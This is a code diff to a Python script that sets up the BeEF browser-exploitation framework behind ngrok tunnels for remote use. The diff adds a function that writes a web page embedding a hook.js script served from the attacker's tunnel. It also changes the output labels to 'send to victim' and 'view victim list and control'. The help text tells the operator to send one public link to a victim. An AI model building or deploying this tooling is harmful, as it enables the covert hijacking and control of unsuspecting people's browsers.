@@ -31,15 +31,16 @@ class BON:
             STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
                 
                 tunnels:
-                first-app:
-                    addr: 80
-                    proto: http
-                second-app:
-                    addr: 3000
-                    proto: http
+                    first-app:
+                        addr: 80
+                        proto: http
+                    second-app:
+                        addr: 3000
+                        proto: http
                 
             STEP 2 : Now Start ngrok with : \n
                     ngrok start --all
+
             STEP 3 : You will See 2 different links Forwarded to\n 
                 Localhost:80              [ Link To be Sent to Victim ]\n
                     Localhost:3000		  [ Your Link will be Connecting to.. ] 	
@@ -139,7 +140,7 @@ class BON:
     def start_services(self):
         try:
             cprint("\n[!] Starting apache2 service", "yellow")
-            subprocess.run(['service', 'apache2', 'start'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            subprocess.run(['service', 'apache2', 'start'])
             cprint("\n[!] Starting beef-framework", "yellow")
             subprocess.run(['beef-xss'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         except Exception:
@@ -161,16 +162,16 @@ class BON:
             exit()
 
     def display_result(self):
-        print("\nBeef UI link: ", end="")
+        print("\nBeef UI link (To view victim list and control): ", end="")
         cprint("http://" + self.port_3000 + "/ui/panel", "green")
-        print("Hook script: ", end="")
+        print("Hook script (Can be embedded in any html page): ", end="")
         cprint("<script src=http://" + self.port_3000 + "/hook.js></script>", "green")
-        print("Html webpage: ", end="")
-        cprint("http://" + self.port_80, "green")
+        print("Demo Html webpage (send to victim): ", end="")
+        cprint("http://" + self.port_80 + "/beef.html", "green")
     
     def restore(self, file_name):
         cprint("\n[!] Stopping apache2 service", "yellow")
-        subprocess.run(['service', 'apache2', 'stop'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(['service', 'apache2', 'stop'])
         cprint("\n[!] Stopping beef-framework", "yellow")
         subprocess.run(['beef-xss-stop'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
@@ -190,6 +191,15 @@ class BON:
         f.write(newdata)
         f.close()
 
+    def demo_html(self):
+        html_data = "<!DOCTYPE html>\n<html>\n<body>\n<h1>Browser Hooked with beef</h1>\n"
+        html_data += "<script src=http://" + self.port_3000 + "/hook.js></script>\n"
+        html_data += "</body>\n</html>"
+
+        f = open("/var/www/html/beef.html",'w')
+        f.write(html_data)
+        f.close()
+
     def run(self):
         self.banner()
         self.check_config()
@@ -201,6 +211,7 @@ class BON:
         self.backup()
         self.replace(self.path + "/config.yaml")
         self.start_services()
+        self.demo_html()
         self.display_result()
         input("\nPress enter to exit")
         self.restore(self.path + "/config.yaml")
